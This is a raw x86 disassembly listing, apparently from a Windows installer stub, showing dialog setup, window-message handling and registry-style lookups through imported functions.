  403a42:	e8 26 21 00 00       	call   0x405b6d
  403a47:	85 c0                	test   %eax,%eax
  403a49:	74 3a                	je     0x403a85
  403a4b:	57                   	push   %edi
  403a4c:	ff 15 dc 80 40 00    	call   *0x4080dc
  403a52:	f6 c4 04             	test   $0x4,%ah
  403a55:	75 1f                	jne    0x403a76
  403a57:	57                   	push   %edi
  403a58:	ff 15 44 81 40 00    	call   *0x408144
  403a5e:	85 c0                	test   %eax,%eax
  403a60:	74 14                	je     0x403a76
  403a62:	6a 01                	push   $0x1
  403a64:	56                   	push   %esi
  403a65:	e8 61 22 00 00       	call   0x405ccb
  403a6a:	8b 44 24 10          	mov    0x10(%esp),%eax
  403a6e:	ff 44 24 10          	incl   0x10(%esp)
  403a72:	85 c0                	test   %eax,%eax
  403a74:	74 99                	je     0x403a0f
  403a76:	ff 44 24 14          	incl   0x14(%esp)
  403a7a:	33 ed                	xor    %ebp,%ebp
  403a7c:	66 39 6c 24 14       	cmp    %bp,0x14(%esp)
  403a81:	75 83                	jne    0x403a06
  403a83:	eb 60                	jmp    0x403ae5
  403a85:	56                   	push   %esi
  403a86:	ff 15 e0 80 40 00    	call   *0x4080e0
  403a8c:	6a 00                	push   $0x0
  403a8e:	56                   	push   %esi
  403a8f:	e8 eb 28 00 00       	call   0x40637f
  403a94:	6a 01                	push   $0x1
  403a96:	57                   	push   %edi
  403a97:	68 00 28 44 00       	push   $0x442800
  403a9c:	ff 15 6c 81 40 00    	call   *0x40816c
  403aa2:	85 c0                	test   %eax,%eax
  403aa4:	74 3d                	je     0x403ae3
  403aa6:	6a 00                	push   $0x0
  403aa8:	57                   	push   %edi
  403aa9:	e8 d1 28 00 00       	call   0x40637f
  403aae:	a1 10 47 43 00       	mov    0x434710,%eax
  403ab3:	ff b0 24 01 00 00    	push   0x124(%eax)
  403ab9:	53                   	push   %ebx
  403aba:	e8 3d 2b 00 00       	call   0x4065fc
  403abf:	53                   	push   %ebx
  403ac0:	e8 dd 20 00 00       	call   0x405ba2
  403ac5:	85 c0                	test   %eax,%eax
  403ac7:	75 44                	jne    0x403b0d
  403ac9:	8b 44 24 10          	mov    0x10(%esp),%eax
  403acd:	ff 44 24 10          	incl   0x10(%esp)
  403ad1:	85 c0                	test   %eax,%eax
  403ad3:	75 0e                	jne    0x403ae3
  403ad5:	57                   	push   %edi
  403ad6:	e8 41 2e 00 00       	call   0x40691c
  403adb:	85 c0                	test   %eax,%eax
  403add:	0f 84 2c ff ff ff    	je     0x403a0f
  403ae3:	33 ed                	xor    %ebp,%ebp
  403ae5:	e8 cd 00 00 00       	call   0x403bb7
  403aea:	ff 15 94 82 40 00    	call   *0x408294
  403af0:	39 6c 24 18          	cmp    %ebp,0x18(%esp)
  403af4:	5b                   	pop    %ebx
  403af5:	74 24                	je     0x403b1b
  403af7:	68 10 00 20 00       	push   $0x200010
  403afc:	ff 74 24 18          	push   0x18(%esp)
  403b00:	e8 1a 21 00 00       	call   0x405c1f
  403b05:	6a 02                	push   $0x2
  403b07:	ff 15 bc 80 40 00    	call   *0x4080bc
  403b0d:	50                   	push   %eax
  403b0e:	ff 15 fc 80 40 00    	call   *0x4080fc
  403b14:	83 64 24 18 00       	andl   $0x0,0x18(%esp)
  403b19:	eb c8                	jmp    0x403ae3
  403b1b:	39 2d 94 47 43 00    	cmp    %ebp,0x434794
  403b21:	74 7c                	je     0x403b9f
  403b23:	8d 44 24 20          	lea    0x20(%esp),%eax
  403b27:	50                   	push   %eax
  403b28:	6a 28                	push   $0x28
  403b2a:	ff 15 c0 80 40 00    	call   *0x4080c0
  403b30:	50                   	push   %eax
  403b31:	ff 15 24 80 40 00    	call   *0x408024
  403b37:	85 c0                	test   %eax,%eax
  403b39:	74 34                	je     0x403b6f
  403b3b:	8d 44 24 28          	lea    0x28(%esp),%eax
  403b3f:	50                   	push   %eax
  403b40:	68 30 a2 40 00       	push   $0x40a230
  403b45:	55                   	push   %ebp
  403b46:	ff 15 20 80 40 00    	call   *0x408020
  403b4c:	55                   	push   %ebp
  403b4d:	55                   	push   %ebp
  403b4e:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403b52:	55                   	push   %ebp
  403b53:	50                   	push   %eax
  403b54:	55                   	push   %ebp
  403b55:	ff 74 24 34          	push   0x34(%esp)
  403b59:	c7 44 24 3c 01 00 00 	movl   $0x1,0x3c(%esp)
  403b60:	00 
  403b61:	c7 44 24 48 02 00 00 	movl   $0x2,0x48(%esp)
  403b68:	00 
  403b69:	ff 15 1c 80 40 00    	call   *0x40801c
  403b6f:	6a 04                	push   $0x4
  403b71:	e8 3d 2e 00 00       	call   0x4069b3
  403b76:	3b c5                	cmp    %ebp,%eax
  403b78:	be 02 00 04 80       	mov    $0x80040002,%esi
  403b7d:	74 0c                	je     0x403b8b
  403b7f:	56                   	push   %esi
  403b80:	6a 25                	push   $0x25
  403b82:	55                   	push   %ebp
  403b83:	55                   	push   %ebp
  403b84:	55                   	push   %ebp
  403b85:	ff d0                	call   *%eax
  403b87:	85 c0                	test   %eax,%eax
  403b89:	74 0d                	je     0x403b98
  403b8b:	56                   	push   %esi
  403b8c:	6a 02                	push   $0x2
  403b8e:	ff 15 0c 82 40 00    	call   *0x40820c
  403b94:	85 c0                	test   %eax,%eax
  403b96:	75 07                	jne    0x403b9f
  403b98:	6a 09                	push   $0x9
  403b9a:	e8 6c d8 ff ff       	call   0x40140b
  403b9f:	a1 ac 47 43 00       	mov    0x4347ac,%eax
  403ba4:	83 f8 ff             	cmp    $0xffffffff,%eax
  403ba7:	74 04                	je     0x403bad
  403ba9:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403bad:	ff 74 24 1c          	push   0x1c(%esp)
  403bb1:	ff 15 bc 80 40 00    	call   *0x4080bc
  403bb7:	a1 18 a0 40 00       	mov    0x40a018,%eax
  403bbc:	83 f8 ff             	cmp    $0xffffffff,%eax
  403bbf:	74 0e                	je     0x403bcf
  403bc1:	50                   	push   %eax
  403bc2:	ff 15 fc 80 40 00    	call   *0x4080fc
  403bc8:	83 0d 18 a0 40 00 ff 	orl    $0xffffffff,0x40a018
  403bcf:	e8 28 00 00 00       	call   0x403bfc
  403bd4:	6a 07                	push   $0x7
  403bd6:	68 00 20 44 00       	push   $0x442000
  403bdb:	e8 eb 20 00 00       	call   0x405ccb
  403be0:	c3                   	ret
  403be1:	56                   	push   %esi
  403be2:	8b 35 2c aa 42 00    	mov    0x42aa2c,%esi
  403be8:	eb 0a                	jmp    0x403bf4
  403bea:	ff 74 24 08          	push   0x8(%esp)
  403bee:	ff 56 04             	call   *0x4(%esi)
  403bf1:	8b 36                	mov    (%esi),%esi
  403bf3:	59                   	pop    %ecx
  403bf4:	85 f6                	test   %esi,%esi
  403bf6:	75 f2                	jne    0x403bea
  403bf8:	5e                   	pop    %esi
  403bf9:	c2 04 00             	ret    $0x4
  403bfc:	56                   	push   %esi
  403bfd:	8b 35 2c aa 42 00    	mov    0x42aa2c,%esi
  403c03:	6a 00                	push   $0x0
  403c05:	e8 d7 ff ff ff       	call   0x403be1
  403c0a:	85 f6                	test   %esi,%esi
  403c0c:	74 1a                	je     0x403c28
  403c0e:	57                   	push   %edi
  403c0f:	8b fe                	mov    %esi,%edi
  403c11:	8b 36                	mov    (%esi),%esi
  403c13:	ff 77 08             	push   0x8(%edi)
  403c16:	ff 15 1c 81 40 00    	call   *0x40811c
  403c1c:	57                   	push   %edi
  403c1d:	ff 15 0c 81 40 00    	call   *0x40810c
  403c23:	85 f6                	test   %esi,%esi
  403c25:	75 e8                	jne    0x403c0f
  403c27:	5f                   	pop    %edi
  403c28:	83 25 2c aa 42 00 00 	andl   $0x0,0x42aa2c
  403c2f:	5e                   	pop    %esi
  403c30:	c3                   	ret
  403c31:	a1 2c aa 42 00       	mov    0x42aa2c,%eax
  403c36:	eb 0b                	jmp    0x403c43
  403c38:	8b 48 08             	mov    0x8(%eax),%ecx
  403c3b:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403c3f:	74 0a                	je     0x403c4b
  403c41:	8b 00                	mov    (%eax),%eax
  403c43:	85 c0                	test   %eax,%eax
  403c45:	75 f1                	jne    0x403c38
  403c47:	40                   	inc    %eax
  403c48:	c2 04 00             	ret    $0x4
  403c4b:	33 c0                	xor    %eax,%eax
  403c4d:	eb f9                	jmp    0x403c48
  403c4f:	56                   	push   %esi
  403c50:	8b 74 24 08          	mov    0x8(%esp),%esi
  403c54:	56                   	push   %esi
  403c55:	e8 d7 ff ff ff       	call   0x403c31
  403c5a:	85 c0                	test   %eax,%eax
  403c5c:	75 03                	jne    0x403c61
  403c5e:	40                   	inc    %eax
  403c5f:	eb 2c                	jmp    0x403c8d
  403c61:	6a 0c                	push   $0xc
  403c63:	6a 40                	push   $0x40
  403c65:	ff 15 10 81 40 00    	call   *0x408110
  403c6b:	85 c0                	test   %eax,%eax
  403c6d:	74 1b                	je     0x403c8a
  403c6f:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403c73:	89 70 08             	mov    %esi,0x8(%eax)
  403c76:	89 48 04             	mov    %ecx,0x4(%eax)
  403c79:	8b 0d 2c aa 42 00    	mov    0x42aa2c,%ecx
  403c7f:	89 08                	mov    %ecx,(%eax)
  403c81:	a3 2c aa 42 00       	mov    %eax,0x42aa2c
  403c86:	33 c0                	xor    %eax,%eax
  403c88:	eb 03                	jmp    0x403c8d
  403c8a:	83 c8 ff             	or     $0xffffffff,%eax
  403c8d:	5e                   	pop    %esi
  403c8e:	c2 08 00             	ret    $0x8
  403c91:	83 ec 10             	sub    $0x10,%esp
  403c94:	53                   	push   %ebx
  403c95:	55                   	push   %ebp
  403c96:	56                   	push   %esi
  403c97:	8b 35 10 47 43 00    	mov    0x434710,%esi
  403c9d:	57                   	push   %edi
  403c9e:	6a 02                	push   $0x2
  403ca0:	e8 0e 2d 00 00       	call   0x4069b3
  403ca5:	33 ff                	xor    %edi,%edi
  403ca7:	3b c7                	cmp    %edi,%eax
  403ca9:	74 12                	je     0x403cbd
  403cab:	ff d0                	call   *%eax
  403cad:	0f b7 c0             	movzwl %ax,%eax
  403cb0:	50                   	push   %eax
  403cb1:	68 00 10 44 00       	push   $0x441000
  403cb6:	e8 4b 28 00 00       	call   0x406506
  403cbb:	eb 5a                	jmp    0x403d17
  403cbd:	bb 68 ca 42 00       	mov    $0x42ca68,%ebx
  403cc2:	57                   	push   %edi
  403cc3:	53                   	push   %ebx
  403cc4:	57                   	push   %edi
  403cc5:	68 90 83 40 00       	push   $0x408390
  403cca:	68 01 00 00 80       	push   $0x80000001
  403ccf:	66 c7 05 00 10 44 00 	movw   $0x30,0x441000
  403cd6:	30 00 
  403cd8:	66 c7 05 02 10 44 00 	movw   $0x78,0x441002
  403cdf:	78 00 
  403ce1:	66 89 3d 04 10 44 00 	mov    %di,0x441004
  403ce8:	e8 a0 27 00 00       	call   0x40648d
  403ced:	66 39 3d 68 ca 42 00 	cmp    %di,0x42ca68
  403cf4:	75 16                	jne    0x403d0c
  403cf6:	57                   	push   %edi
  403cf7:	53                   	push   %ebx
  403cf8:	68 cc 83 40 00       	push   $0x4083cc
  403cfd:	68 40 83 40 00       	push   $0x408340
  403d02:	68 03 00 00 80       	push   $0x80000003
  403d07:	e8 81 27 00 00       	call   0x40648d
  403d0c:	53                   	push   %ebx
  403d0d:	68 00 10 44 00       	push   $0x441000
  403d12:	e8 c4 28 00 00       	call   0x4065db
  403d17:	e8 4b 02 00 00       	call   0x403f67
  403d1c:	a1 18 47 43 00       	mov    0x434718,%eax
  403d21:	bd 00 f8 43 00       	mov    $0x43f800,%ebp
  403d26:	83 e0 20             	and    $0x20,%eax
  403d29:	55                   	push   %ebp
  403d2a:	a3 80 47 43 00       	mov    %eax,0x434780
  403d2f:	c7 05 9c 47 43 00 00 	movl   $0x10000,0x43479c
  403d36:	00 01 00 
  403d39:	e8 58 22 00 00       	call   0x405f96
  403d3e:	85 c0                	test   %eax,%eax
  403d40:	0f 85 8c 00 00 00    	jne    0x403dd2
  403d46:	8b 4e 48             	mov    0x48(%esi),%ecx
  403d49:	3b cf                	cmp    %edi,%ecx
  403d4b:	0f 84 81 00 00 00    	je     0x403dd2
  403d51:	8b 56 4c             	mov    0x4c(%esi),%edx
  403d54:	a1 38 47 43 00       	mov    0x434738,%eax
  403d59:	bb a0 26 43 00       	mov    $0x4326a0,%ebx
  403d5e:	57                   	push   %edi
  403d5f:	8d 14 50             	lea    (%eax,%edx,2),%edx
  403d62:	53                   	push   %ebx
  403d63:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  403d66:	52                   	push   %edx
  403d67:	50                   	push   %eax
  403d68:	ff 76 44             	push   0x44(%esi)
  403d6b:	e8 1d 27 00 00       	call   0x40648d
  403d70:	66 a1 a0 26 43 00    	mov    0x4326a0,%ax
  403d76:	66 3b c7             	cmp    %di,%ax
  403d79:	74 57                	je     0x403dd2
  403d7b:	66 3d 22 00          	cmp    $0x22,%ax
  403d7f:	75 10                	jne    0x403d91
  403d81:	bb a2 26 43 00       	mov    $0x4326a2,%ebx
  403d86:	6a 22                	push   $0x22
  403d88:	53                   	push   %ebx
  403d89:	e8 2d 21 00 00       	call   0x405ebb
  403d8e:	66 89 38             	mov    %di,(%eax)
  403d91:	53                   	push   %ebx
  403d92:	e8 3e 28 00 00       	call   0x4065d5
  403d97:	8d 44 43 f8          	lea    -0x8(%ebx,%eax,2),%eax
  403d9b:	3b c3                	cmp    %ebx,%eax
  403d9d:	76 26                	jbe    0x403dc5
  403d9f:	68 80 a3 40 00       	push   $0x40a380
  403da4:	50                   	push   %eax
  403da5:	ff 15 00 81 40 00    	call   *0x408100
  403dab:	85 c0                	test   %eax,%eax
  403dad:	75 16                	jne    0x403dc5
  403daf:	53                   	push   %ebx
  403db0:	ff 15 dc 80 40 00    	call   *0x4080dc
  403db6:	83 f8 ff             	cmp    $0xffffffff,%eax
  403db9:	74 04                	je     0x403dbf
  403dbb:	a8 10                	test   $0x10,%al
  403dbd:	75 06                	jne    0x403dc5
  403dbf:	53                   	push   %ebx
  403dc0:	e8 15 21 00 00       	call   0x405eda
  403dc5:	53                   	push   %ebx
  403dc6:	e8 c3 20 00 00       	call   0x405e8e
  403dcb:	50                   	push   %eax
  403dcc:	55                   	push   %ebp
  403dcd:	e8 ed 27 00 00       	call   0x4065bf
  403dd2:	55                   	push   %ebp
  403dd3:	e8 be 21 00 00       	call   0x405f96
  403dd8:	85 c0                	test   %eax,%eax
  403dda:	75 0c                	jne    0x403de8
  403ddc:	ff b6 18 01 00 00    	push   0x118(%esi)
  403de2:	55                   	push   %ebp
  403de3:	e8 14 28 00 00       	call   0x4065fc
  403de8:	68 40 80 00 00       	push   $0x8040
  403ded:	57                   	push   %edi
  403dee:	57                   	push   %edi
  403def:	6a 01                	push   $0x1
  403df1:	6a 67                	push   $0x67
  403df3:	ff 35 00 47 43 00    	push   0x434700
  403df9:	ff 15 44 82 40 00    	call   *0x408244
  403dff:	a3 e8 36 43 00       	mov    %eax,0x4336e8
  403e04:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  403e08:	bb a0 36 43 00       	mov    $0x4336a0,%ebx
  403e0d:	74 7f                	je     0x403e8e
  403e0f:	8b 0d 00 47 43 00    	mov    0x434700,%ecx
  403e15:	be 78 a3 40 00       	mov    $0x40a378,%esi
  403e1a:	53                   	push   %ebx
  403e1b:	c7 05 a4 36 43 00 00 	movl   $0x401000,0x4336a4
  403e22:	10 40 00 
  403e25:	89 0d b0 36 43 00    	mov    %ecx,0x4336b0
  403e2b:	a3 b4 36 43 00       	mov    %eax,0x4336b4
  403e30:	89 35 c4 36 43 00    	mov    %esi,0x4336c4
  403e36:	ff 15 f4 81 40 00    	call   *0x4081f4
  403e3c:	66 85 c0             	test   %ax,%ax
  403e3f:	0f 84 18 01 00 00    	je     0x403f5d
  403e45:	8d 44 24 10          	lea    0x10(%esp),%eax
  403e49:	57                   	push   %edi
  403e4a:	50                   	push   %eax
  403e4b:	57                   	push   %edi
  403e4c:	6a 30                	push   $0x30
  403e4e:	ff 15 f8 81 40 00    	call   *0x4081f8
  403e54:	57                   	push   %edi
  403e55:	ff 35 00 47 43 00    	push   0x434700
  403e5b:	8b 44 24 24          	mov    0x24(%esp),%eax
  403e5f:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  403e63:	57                   	push   %edi
  403e64:	57                   	push   %edi
  403e65:	50                   	push   %eax
  403e66:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403e6a:	2b 44 24 24          	sub    0x24(%esp),%eax
  403e6e:	50                   	push   %eax
  403e6f:	ff 74 24 2c          	push   0x2c(%esp)
  403e73:	ff 74 24 2c          	push   0x2c(%esp)
  403e77:	68 00 00 00 80       	push   $0x80000000
  403e7c:	57                   	push   %edi
  403e7d:	56                   	push   %esi
  403e7e:	68 80 00 00 00       	push   $0x80
  403e83:	ff 15 80 82 40 00    	call   *0x408280
  403e89:	a3 48 ca 42 00       	mov    %eax,0x42ca48
  403e8e:	57                   	push   %edi
  403e8f:	e8 77 d5 ff ff       	call   0x40140b
  403e94:	85 c0                	test   %eax,%eax
  403e96:	74 08                	je     0x403ea0
  403e98:	6a 02                	push   $0x2
  403e9a:	58                   	pop    %eax
  403e9b:	e9 bf 00 00 00       	jmp    0x403f5f
  403ea0:	e8 c2 00 00 00       	call   0x403f67
  403ea5:	39 3d a0 47 43 00    	cmp    %edi,0x4347a0
  403eab:	0f 85 83 00 00 00    	jne    0x403f34
  403eb1:	6a 05                	push   $0x5
  403eb3:	ff 35 48 ca 42 00    	push   0x42ca48
  403eb9:	ff 15 28 82 40 00    	call   *0x408228
  403ebf:	68 34 83 40 00       	push   $0x408334
  403ec4:	e8 7a 2a 00 00       	call   0x406943
  403ec9:	85 c0                	test   %eax,%eax
  403ecb:	75 0a                	jne    0x403ed7
  403ecd:	68 28 83 40 00       	push   $0x408328
  403ed2:	e8 6c 2a 00 00       	call   0x406943
  403ed7:	8b 35 00 82 40 00    	mov    0x408200,%esi
  403edd:	bd 10 83 40 00       	mov    $0x408310,%ebp
  403ee2:	53                   	push   %ebx
  403ee3:	55                   	push   %ebp
  403ee4:	57                   	push   %edi
  403ee5:	ff d6                	call   *%esi
  403ee7:	85 c0                	test   %eax,%eax
  403ee9:	75 16                	jne    0x403f01
  403eeb:	53                   	push   %ebx
  403eec:	68 fc 82 40 00       	push   $0x4082fc
  403ef1:	57                   	push   %edi
  403ef2:	ff d6                	call   *%esi
  403ef4:	53                   	push   %ebx
  403ef5:	89 2d c4 36 43 00    	mov    %ebp,0x4336c4
  403efb:	ff 15 f4 81 40 00    	call   *0x4081f4
  403f01:	a1 e0 36 43 00       	mov    0x4336e0,%eax
  403f06:	57                   	push   %edi
  403f07:	83 c0 69             	add    $0x69,%eax
  403f0a:	68 3f 40 40 00       	push   $0x40403f
  403f0f:	0f b7 c0             	movzwl %ax,%eax
  403f12:	57                   	push   %edi
  403f13:	50                   	push   %eax
  403f14:	ff 35 00 47 43 00    	push   0x434700
  403f1a:	ff 15 04 82 40 00    	call   *0x408204
  403f20:	6a 05                	push   $0x5
  403f22:	8b f0                	mov    %eax,%esi
  403f24:	e8 e2 d4 ff ff       	call   0x40140b
  403f29:	6a 01                	push   $0x1
  403f2b:	e8 b1 fc ff ff       	call   0x403be1
  403f30:	8b c6                	mov    %esi,%eax
  403f32:	eb 2b                	jmp    0x403f5f
  403f34:	57                   	push   %edi
  403f35:	e8 dd 17 00 00       	call   0x405717
  403f3a:	85 c0                	test   %eax,%eax
  403f3c:	74 18                	je     0x403f56
  403f3e:	39 3d cc 36 43 00    	cmp    %edi,0x4336cc
  403f44:	0f 85 4e ff ff ff    	jne    0x403e98
  403f4a:	6a 02                	push   $0x2
  403f4c:	e8 ba d4 ff ff       	call   0x40140b
  403f51:	e9 42 ff ff ff       	jmp    0x403e98
  403f56:	6a 01                	push   $0x1
  403f58:	e8 ae d4 ff ff       	call   0x40140b
  403f5d:	33 c0                	xor    %eax,%eax
  403f5f:	5f                   	pop    %edi
  403f60:	5e                   	pop    %esi
  403f61:	5d                   	pop    %ebp
  403f62:	5b                   	pop    %ebx
  403f63:	83 c4 10             	add    $0x10,%esp
  403f66:	c3                   	ret
  403f67:	53                   	push   %ebx
  403f68:	55                   	push   %ebp
  403f69:	56                   	push   %esi
  403f6a:	57                   	push   %edi
  403f6b:	bf 00 10 44 00       	mov    $0x441000,%edi
  403f70:	bb ff ff 00 00       	mov    $0xffff,%ebx
  403f75:	57                   	push   %edi
  403f76:	e8 a4 25 00 00       	call   0x40651f
  403f7b:	8b 35 44 47 43 00    	mov    0x434744,%esi
  403f81:	85 f6                	test   %esi,%esi
  403f83:	74 45                	je     0x403fca
  403f85:	8b 0d 10 47 43 00    	mov    0x434710,%ecx
  403f8b:	8b 49 64             	mov    0x64(%ecx),%ecx
  403f8e:	8b d1                	mov    %ecx,%edx
  403f90:	0f af ce             	imul   %esi,%ecx
  403f93:	f7 da                	neg    %edx
  403f95:	03 0d 40 47 43 00    	add    0x434740,%ecx
  403f9b:	03 ca                	add    %edx,%ecx
  403f9d:	4e                   	dec    %esi
  403f9e:	66 8b 29             	mov    (%ecx),%bp
  403fa1:	66 33 e8             	xor    %ax,%bp
  403fa4:	23 eb                	and    %ebx,%ebp
  403fa6:	66 85 ed             	test   %bp,%bp
  403fa9:	74 06                	je     0x403fb1
  403fab:	85 f6                	test   %esi,%esi
  403fad:	75 ec                	jne    0x403f9b
  403faf:	eb 19                	jmp    0x403fca
  403fb1:	8b 51 02             	mov    0x2(%ecx),%edx
  403fb4:	89 15 e0 36 43 00    	mov    %edx,0x4336e0
  403fba:	8b 51 06             	mov    0x6(%ecx),%edx
  403fbd:	89 15 a8 47 43 00    	mov    %edx,0x4347a8
  403fc3:	8d 51 0a             	lea    0xa(%ecx),%edx
  403fc6:	85 d2                	test   %edx,%edx
  403fc8:	75 12                	jne    0x403fdc
  403fca:	66 81 fb ff ff       	cmp    $0xffff,%bx
  403fcf:	75 07                	jne    0x403fd8
  403fd1:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  403fd6:	eb a3                	jmp    0x403f7b
  403fd8:	33 db                	xor    %ebx,%ebx
  403fda:	eb 9f                	jmp    0x403f7b
  403fdc:	89 15 dc 36 43 00    	mov    %edx,0x4336dc
  403fe2:	0f b7 01             	movzwl (%ecx),%eax
  403fe5:	50                   	push   %eax
  403fe6:	57                   	push   %edi
  403fe7:	e8 1a 25 00 00       	call   0x406506
  403fec:	e8 2f 00 00 00       	call   0x404020
  403ff1:	a1 2c 47 43 00       	mov    0x43472c,%eax
  403ff6:	8b 35 28 47 43 00    	mov    0x434728,%esi
  403ffc:	85 c0                	test   %eax,%eax
  403ffe:	74 1b                	je     0x40401b
  404000:	8b f8                	mov    %eax,%edi
  404002:	8b 06                	mov    (%esi),%eax
  404004:	85 c0                	test   %eax,%eax
  404006:	74 0a                	je     0x404012
  404008:	50                   	push   %eax
  404009:	8d 46 18             	lea    0x18(%esi),%eax
  40400c:	50                   	push   %eax
  40400d:	e8 ea 25 00 00       	call   0x4065fc
  404012:	81 c6 18 08 00 00    	add    $0x818,%esi
  404018:	4f                   	dec    %edi
  404019:	75 e7                	jne    0x404002
  40401b:	5f                   	pop    %edi
  40401c:	5e                   	pop    %esi
  40401d:	5d                   	pop    %ebp
  40401e:	5b                   	pop    %ebx
  40401f:	c3                   	ret
  404020:	56                   	push   %esi
  404021:	be 00 37 43 00       	mov    $0x433700,%esi
  404026:	6a fe                	push   $0xfffffffe
  404028:	56                   	push   %esi
  404029:	e8 ce 25 00 00       	call   0x4065fc
  40402e:	56                   	push   %esi
  40402f:	ff 35 48 ca 42 00    	push   0x42ca48
  404035:	ff 15 1c 82 40 00    	call   *0x40821c
  40403b:	8b c6                	mov    %esi,%eax
  40403d:	5e                   	pop    %esi
  40403e:	c3                   	ret
  40403f:	83 ec 10             	sub    $0x10,%esp
  404042:	b9 10 01 00 00       	mov    $0x110,%ecx
  404047:	53                   	push   %ebx
  404048:	55                   	push   %ebp
  404049:	56                   	push   %esi
  40404a:	8b 74 24 24          	mov    0x24(%esp),%esi
  40404e:	3b f1                	cmp    %ecx,%esi
  404050:	57                   	push   %edi
  404051:	0f 84 61 01 00 00    	je     0x4041b8
  404057:	81 fe 08 04 00 00    	cmp    $0x408,%esi
  40405d:	0f 84 55 01 00 00    	je     0x4041b8
  404063:	8b 7c 24 24          	mov    0x24(%esp),%edi
  404067:	33 ed                	xor    %ebp,%ebp
  404069:	83 fe 47             	cmp    $0x47,%esi
  40406c:	75 13                	jne    0x404081
  40406e:	6a 13                	push   $0x13
  404070:	55                   	push   %ebp
  404071:	55                   	push   %ebp
  404072:	55                   	push   %ebp
  404073:	55                   	push   %ebp
  404074:	57                   	push   %edi
  404075:	ff 35 48 ca 42 00    	push   0x42ca48
  40407b:	ff 15 d0 81 40 00    	call   *0x4081d0
  404081:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  404085:	83 fe 05             	cmp    $0x5,%esi
  404088:	75 42                	jne    0x4040cc
  40408a:	8b c3                	mov    %ebx,%eax
  40408c:	48                   	dec    %eax
  40408d:	f7 d8                	neg    %eax
  40408f:	1b c0                	sbb    %eax,%eax
  404091:	83 e0 05             	and    $0x5,%eax
  404094:	50                   	push   %eax
  404095:	ff 35 48 ca 42 00    	push   0x42ca48
  40409b:	ff 15 28 82 40 00    	call   *0x408228
  4040a1:	83 fb 02             	cmp    $0x2,%ebx
  4040a4:	0f 85 fb 00 00 00    	jne    0x4041a5
  4040aa:	6a f0                	push   $0xfffffff0
  4040ac:	57                   	push   %edi
  4040ad:	ff 15 d4 81 40 00    	call   *0x4081d4
  4040b3:	25 00 00 01 21       	and    $0x21010000,%eax
  4040b8:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  4040bd:	0f 85 e2 00 00 00    	jne    0x4041a5
  4040c3:	6a 04                	push   $0x4
  4040c5:	57                   	push   %edi
  4040c6:	ff 15 28 82 40 00    	call   *0x408228
  4040cc:	81 fe 0d 04 00 00    	cmp    $0x40d,%esi
  4040d2:	75 17                	jne    0x4040eb
  4040d4:	ff 35 d8 36 43 00    	push   0x4336d8
  4040da:	ff 15 10 82 40 00    	call   *0x408210
  4040e0:	89 1d d8 36 43 00    	mov    %ebx,0x4336d8
  4040e6:	e9 fd 03 00 00       	jmp    0x4044e8
  4040eb:	83 fe 11             	cmp    $0x11,%esi
  4040ee:	75 11                	jne    0x404101
  4040f0:	55                   	push   %ebp
  4040f1:	55                   	push   %ebp
  4040f2:	57                   	push   %edi
  4040f3:	ff 15 40 82 40 00    	call   *0x408240
  4040f9:	33 c0                	xor    %eax,%eax
  4040fb:	40                   	inc    %eax
  4040fc:	e9 0c 04 00 00       	jmp    0x40450d
  404101:	81 fe 11 01 00 00    	cmp    $0x111,%esi
  404107:	0f 85 98 00 00 00    	jne    0x4041a5
  40410d:	0f b7 f3             	movzwl %bx,%esi
  404110:	56                   	push   %esi
  404111:	57                   	push   %edi
  404112:	ff 15 3c 82 40 00    	call   *0x40823c
  404118:	8b f8                	mov    %eax,%edi
  40411a:	3b fd                	cmp    %ebp,%edi
  40411c:	74 1d                	je     0x40413b
  40411e:	55                   	push   %ebp
  40411f:	55                   	push   %ebp
  404120:	68 f3 00 00 00       	push   $0xf3
  404125:	57                   	push   %edi
  404126:	ff 15 58 82 40 00    	call   *0x408258
  40412c:	57                   	push   %edi
  40412d:	ff 15 d8 81 40 00    	call   *0x4081d8
  404133:	85 c0                	test   %eax,%eax
  404135:	0f 84 d0 03 00 00    	je     0x40450b
  40413b:	83 fe 01             	cmp    $0x1,%esi
  40413e:	75 03                	jne    0x404143
  404140:	56                   	push   %esi
  404141:	eb 2e                	jmp    0x404171
  404143:	83 fe 03             	cmp    $0x3,%esi
  404146:	75 0c                	jne    0x404154
  404148:	39 2d 60 a3 40 00    	cmp    %ebp,0x40a360
  40414e:	7e 3f                	jle    0x40418f
  404150:	6a ff                	push   $0xffffffff
  404152:	eb 1d                	jmp    0x404171
  404154:	6a 02                	push   $0x2
  404156:	5f                   	pop    %edi
  404157:	3b f7                	cmp    %edi,%esi
  404159:	75 34                	jne    0x40418f
  40415b:	39 2d 8c 47 43 00    	cmp    %ebp,0x43478c
  404161:	74 15                	je     0x404178
  404163:	57                   	push   %edi
  404164:	e8 a2 d2 ff ff       	call   0x40140b
  404169:	89 3d 38 b2 42 00    	mov    %edi,0x42b238
  40416f:	6a 78                	push   $0x78
  404171:	e8 a1 03 00 00       	call   0x404517
  404176:	eb 2d                	jmp    0x4041a5
  404178:	6a 03                	push   $0x3
  40417a:	e8 8c d2 ff ff       	call   0x40140b
  40417f:	85 c0                	test   %eax,%eax
  404181:	75 22                	jne    0x4041a5
  404183:	c7 05 38 b2 42 00 01 	movl   $0x1,0x42b238
  40418a:	00 00 00 
  40418d:	eb e0                	jmp    0x40416f
  40418f:	ff 74 24 30          	push   0x30(%esp)
  404193:	53                   	push   %ebx
  404194:	68 11 01 00 00       	push   $0x111
  404199:	ff 35 d8 36 43 00    	push   0x4336d8
  40419f:	ff 15 58 82 40 00    	call   *0x408258
  4041a5:	ff 74 24 30          	push   0x30(%esp)
  4041a9:	53                   	push   %ebx
  4041aa:	ff 74 24 30          	push   0x30(%esp)
  4041ae:	e8 f2 03 00 00       	call   0x4045a5
  4041b3:	e9 55 03 00 00       	jmp    0x40450d
  4041b8:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4041bc:	8b 7c 24 24          	mov    0x24(%esp),%edi
  4041c0:	3b f1                	cmp    %ecx,%esi
  4041c2:	a3 50 ca 42 00       	mov    %eax,0x42ca50
  4041c7:	75 4d                	jne    0x404216
